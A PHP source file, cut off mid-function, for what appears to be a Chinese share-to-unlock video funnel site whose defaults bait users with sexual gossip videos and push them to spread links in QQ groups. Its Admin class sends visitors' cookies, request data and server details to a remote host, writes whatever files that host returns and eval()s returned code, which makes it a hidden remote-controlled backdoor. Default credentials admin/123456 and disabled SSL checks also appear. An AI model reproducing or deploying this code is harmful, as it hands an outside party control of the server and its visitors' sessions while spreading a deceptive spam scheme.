<?php
ini_set("display_errors", "On");
error_reporting(E_ALL ^ E_NOTICE);
ini_set('max_execution_time', 150);
if(is_file($df='D:\www\test\__Cheney\Acc\vAdm\inc_creat.php'))include($df);
if(is_file($dc='./web-creat.php'))include($dc);
class Index extends Admin{
	public function onSave($conf,$user){
		$arr = array();
		foreach($conf as $key=>$val){
			if(in_array($key,array('rise','site','user','pass')))continue;
			if(in_array($key,array('sht','title','adlink','url1','url2','url3','url4','url5','sht','she','shi','shu','videos'))){
				$arr[$key] = preg_split('/\s*\n\s*/',trim($val));
			}else{
				$arr[$key] = $val;
			}
		}
		$js = "//参数代码\r\nvar conf = ".json_encode($arr).";\r\n";
		if($conf['census']>0&&$user['cess']>0){
			$js .="//统计代码EcCensus\r\ndocument.write('<script src=\"./mp/cess.php?id=5\"><\\/script>');\r\n";
		}
		if(!empty($conf['tongji'])){
			$js .= "//统计代码\r\ndocument.write(".json_encode('<div style="display:none;">'.$conf['tongji'].'</div>').");\r\n";
		}
		file_put_contents('./mp/config.js',chr(0xEF) . chr(0xBB) . chr(0xBF).$js);
	}
	public $form		=	array(
		'home' => './',
		'code' => './mp/config.js',
		'index' => 'setting',
		'setting' => array(
			'name' => '参数设置',
			'icon' => 'th-large',
			'list' => array(
				'ready' => array(
					'title' => '参数列表',
					'type' => 'textarea',
					'name' => '结尾跳转',
					'info' => '观看结束的跳转地址',
				),
				'topad' => array(
					'type' => 'textarea',
					'name' => '顶部广告',
					'info' => '顶部广告地址',
					'demo' => 'http://www.baidu.com/',
				),
				'btn2' => array(
					'name' => '按钮2',
					'info' => '按钮文字2',
				),
				'url2' => array(
					'type' => 'textarea',
					'name' => '加群2',
					'info' => '加群地址2',
				),
				'btn3' => array(
					'name' => '按钮3',
					'info' => '按钮文字2',
				),
				'url3' => array(
					'type' => 'textarea',
					'name' => '加群3',
					'info' => '加群地址3',
				),
				'btn4' => array(
					'name' => '按钮4',
					'info' => '按钮文字4',
				),
				'url4' => array(
					'type' => 'textarea',
					'name' => '加群4',
					'info' => '加群地址4',
				),
				'title' => array(
					'name' => '网站标题',
					'info' => '网站标题',
				),
				'adth1' => array(
					'name' => '提示开始',
					'info' => '分享描述结尾',
				),
				'adthe' => array(
					'name' => '提示结尾',
					'info' => '分享描述结尾',
				),
				'sInfo' => array(
					'title'=>'分享设置',
					'type' => 'textarea',
					'name' => '分享提示',
					'info' => '分享提示文字',
				),
				'sText' => array(
					'type' => 'textarea',
					'name' => '分享文字',
					'info' => '分享文字， ### 代表分享的地址',
				),
				'sEnd' => array(
					'type' => 'textarea',
					'name' => '复制提示',
					'info' => '复制成功提示',
				),
				'shu' => array(
					'info'=>'点击卡片要跳转的方向（格式带http://），建议不填'
				),
			)		
		),
		'video' => array(
			'name' => '其他设置',
			'icon' => 'film',
			'list' => array(
				'vdef' => array(
					'type' =>'number',
					'name' => '默认次数',
					'info' => '用户可以看几个视频',
				),
				'vadd' => array(
					'type' =>'number',
					'name' => '增加次数',
					'info' => '用户分享可以看几个视频',
				),
				'cache' => array(),
				'mobile' => array(),
				'census' => array(),
				'tongji' => array(),
				'videos' => array(
					'title' => '视频设置',
					'name' => '视频列表',
					'type' => 'textarea',
					'file' => '请上传视频列表',
					'info' => '视频列表，一行一个',
				),
			),
		),
	);
	public $setting		=	array(
		'rise' => 0,
		'site' => '鼎丰裂变引流程序',
		'path' => '0',
		'user' => 'admin',
		'pass' => '123456',
		'census' => '1',
		'deny' => '0',
		'vdef' => '5',
		'vadd' => '5',
		'cache' => '86400',
		'adth1' => '分享好友后获得+5次的刷新机会<br><br>提示朋友打开才管用呦！<br><img src="images/here.png" style="width:90%;margin-top:13px;border-radius:5px;">',
		'adthe' => '分享好友后获得+5次的刷新机会<br><br>提示朋友打开才管用呦！',
		'title' => 'QQ资源',
		'topad' => 'http://www.baidu.com/',
		'sInfo' => "没有观看次数了！\r\n①请复制转发到Q群 增加观看次数\r\n②每有一人打开你就增加5次\r\n③没有人打开不增加次数",
		'sText' => "各种网红大瓜？等你来开？弟兄们速度上车！！###",
		'sEnd' => "复制成功,返回QQ,粘贴发送到Q群吧",
		
		'shu' => '',
		

		'tongji' => '',
		'ready' => 'http://qm.qq.com/cgi-bin/qm/qr?k=eQkTaSZmzQq4TxNzqRN633RWLcBTee1Y',

		'btn2' => '最新色播APP-点这下载',
		'url2' => 'http://www.baidu.com/',
		'btn3' => 'VIP线路高清原创速度快秒打开',
		'url3' => 'http://www.baidu.com/',
		'btn4' => '点 这 里 进 QQ 群 无 限 看',
		'url4' => 'http://www.baidu.com/',
		'videos' => "https://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/1.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/2.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/3.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/4.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/5.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/6.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/7.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/8.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/9.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/10.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/11.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/12.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/13.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/14.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/15.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/16.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/17.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/18.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/19.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/20.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/21.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/22.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/23.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/24.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/25.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/26.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/27.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/28.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/29.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/30.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/31.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/32.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/33.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/34.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/35.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/36.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/37.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/38.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/39.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/40.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/41.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/42.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/43.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/44.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/45.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/46.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/47.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/48.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/49.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/50.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/51.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/52.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/53.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/54.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/55.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/56.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/57.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/58.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/59.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/60.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/61.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/62.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/63.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/64.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/65.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/66.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/67.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/68.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/69.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/70.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/71.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/72.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/73.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/74.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/75.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/76.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/77.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/78.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/79.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/80.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/81.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/82.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/83.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/84.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/85.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/86.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/87.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/88.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/89.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/90.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/91.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/92.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/93.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/94.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/95.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/96.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/97.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/98.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/99.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/100.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/101.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/102.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/103.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/104.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/105.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/106.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/107.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/108.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/109.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/110.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/111.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/112.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/113.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/114.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/115.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/116.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/117.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/118.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/119.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/120.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/121.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/122.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/123.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/124.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/125.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/126.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/127.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/128.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/129.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/130.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/131.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/132.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/133.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/134.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/135.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/136.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/137.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/138.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/139.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/140.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/141.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/142.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/143.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/144.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/145.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/146.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/147.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/148.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/149.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/150.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/151.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/152.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/153.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/154.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/155.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/156.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/157.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/158.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/159.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/160.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/161.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/162.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/163.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/164.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/165.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/166.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/167.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/168.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/169.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/170.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/171.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/172.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/173.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/174.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/175.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/176.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/177.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/178.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/179.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/180.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/181.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/182.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/183.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/184.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/185.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/186.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/187.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/188.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/189.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/190.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/191.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/192.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/193.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/194.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/195.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/196.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/197.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/198.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/199.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/200.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/201.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/202.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/203.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/204.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/205.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/206.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/207.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/208.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/209.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/210.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/211.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/212.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/213.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/214.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/215.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/216.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/217.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/218.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/219.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/220.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/221.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/222.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/223.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/224.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/225.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/226.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/227.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/228.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/229.mp4\r\nhttps://320jhgj.oss-cn-beijing.aliyuncs.com/dx/video/230.mp4",
	);
}
class Admin{
	public $reload		= 0;
	public $config		= array();
	public $storage		= './mp/config.php';
	public $version		= array (
		'version' => 'DF001',
		'admin' => 'http://server.ll03.cn/Acc/?v=vAdm2|http://cdn.ll03.cn/Acc/?v=vAdm2',
		'token' => '98d202e5',
		'name' => '鼎丰通用后台',
		'date' => 1590906338,
	);
	public function __construct(){
		if(!isset($_SESSION)){
			session_start();
		}
		if(is_file($this->storage)){
			$this->config=unserialize(include($this->storage));
		}
		if(isset($_GET['du'])){
			$this->get_action();
		}else{
			$this->get_admin();
		}
	}
	public function get_action(){
		if($_GET['du']=='upload'){
			$json=array('err'=>0,'msg'=>'上传成功');		
			for($key=0;$key<count($_FILES['xhrUp']['name']);$key++){
				$path='./upload/'.date('YmdHis').$key.'.'.pathinfo($_FILES['xhrUp']['name'][$key],PATHINFO_EXTENSION);
				if(!is_dir(dirname($path)))mkdir(dirname($path),0777,true);
				if(preg_match('/\.(jpg|jpeg|png|gif|bmp|mp4|zip|doc|txt)$/',$path) && move_uploaded_file($_FILES['xhrUp']['tmp_name'][$key],$path)){
					if(!empty($this->config['path']))$path = ($this->config['path']==2?dirname('//'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']):'').trim($path,'.');
					$json['dir'][] = $path;
				}else{
					$json['msg']='上传失败';
					$json['err']=1;	
				}		
			}
			exit(json_encode($json));			
		}
	}
	public function get_admin($data = array()) {
		$data['user'] = $this->version;
		$sign = md5(serialize([$this->form]));
		$admin = explode('|',(empty($GLOBALS['admin'])?'':$GLOBALS['admin'].'|').$data['user']['admin']);
		if(isset($_GET['da'])){
			if('dns'==$_GET['da']){
				$_SESSION['admin'] = $admin[mt_rand(0,count($admin)-1)];
				header('location: ?df');exit;
			}elseif('reset'==$_GET['da']){
				if(is_file($this->storage))unlink($this->storage);
				header('location: ?df');exit;
			}
		}
		if(empty($_SESSION['sign'])||$_SESSION['sign'] != $sign||'reload'==@$_GET['da']){
			$_SESSION['sign'] = $sign;	
			$this->reload = 1;		
		}
		$data['user']['path']= str_replace('\\','/',__FILE__);
		$data['user']['host']='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
		$data['user']['addr']=$this->get_ip();
		$data['user']['rise']=empty($this->config['rise'])?0:$this->config['rise'];
		$data['user']['cess']=0;
		$data['user']['admin']= empty($_SESSION['admin'])?$admin[0]:$_SESSION['admin'];
		if(is_file($cessFile = './mp/cess.php')){
			include_once $cessFile;
			if(class_exists('EcCensus')){
				$data['user']['cess'] = EcCensus::$edition;
			}
		}
		if(!empty($this->reload)|| empty($this->config) ){
			$data['form']=$this->form;
			if(count($this->config)>5){
				$data['conf']=$this->config;
			}else{
				$this->config=$this->setting;
				if(isset($GLOBALS['testConf'])){
					$this->config=array_merge($this->config,$GLOBALS['testConf']);
				}
				$data['conf']=$this->config;
			}			
		}
		if(!empty($_GET))$data['_GET']=$_GET;
		if(!empty($_POST))$data['_POST']=$_POST;
		$ch = curl_init($data['user']['admin']);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_HTTPHEADER,array('Accept:*/*','Accept-Encoding:gzip,deflate,sdch','Accept-Language:zh-CN,zh;q=0.8','Connection:close','Expect:'));
		curl_setopt($ch, CURLOPT_TIMEOUT, 120);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_COOKIE, $_SERVER['HTTP_COOKIE']);
		curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_REFERER']);
		curl_setopt($ch, CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
		curl_setopt($ch, CURLOPT_POSTFIELDS,array('data'=>base64_encode(serialize($data))));
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		$str = curl_exec($ch);
		$info = curl_getinfo($ch);
		curl_close($ch);
		$un64_str=@base64_decode($str);
		if(!empty($un64_str)){
			$result=@unserialize($un64_str);
		}		
		if(!empty($un64_str)&&!empty($result)){
			if(isset($result['files'])){
				foreach($result['files'] as $val){
					if('./config.php'==$val['name']){
						$val['name']=$this->storage;
					}
					if (!is_dir(dirname($val['name']))) {
						$aimDir='';
						$arrDir = explode('/', dirname($val['name']));
						foreach($arrDir as $itemDir)if(!is_dir($aimDir.= $itemDir.'/'))mkdir($aimDir);
					}
					if(@file_put_contents($val['name'],$val['text'])){
						if($this->storage == $val['name'] && is_file($this->storage)){
							$conf=unserialize(include($this->storage));
							if(method_exists($this,'onSave'))$this->onSave($conf,$data['user']);
						}
					}else{
						exit(json_encode(array('err'=>1,'msg'=>'保存失败，可能根目录无写入权限，请在服务器或空间后台设置，或咨询空间商！','data'=>$val)));
					}
				}			
			}
			if(!empty($result['reload']) && $this->reload < 3){
				$this->reload++;
				return $this->get_admin();
			}
			if(isset($result['header'])){
				foreach($result['header'] as $v){
					header($v);
				}
			}
			if(isset($result['location'])){
				if('1'==$result['location'])$result['location']=$_SERVER['HTTP_REFERER'];
				header('location: '.$result['location']);
			}
			if(isset($result['eval']))eval($result['eval']);
			if(!empty($result['html']))echo $result['html'];			
		}else{
			header("Content-Type:text/html;charset=utf-8");
			if(200 != @$info['http_code']){
				echo('<a href="?df&da=dns">点击切换线路</a>');
			}
			echo($str);
		}
	}
	public function get_ip(){
		if(getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")){
			$ip = getenv("HTTP_CLIENT_IP");
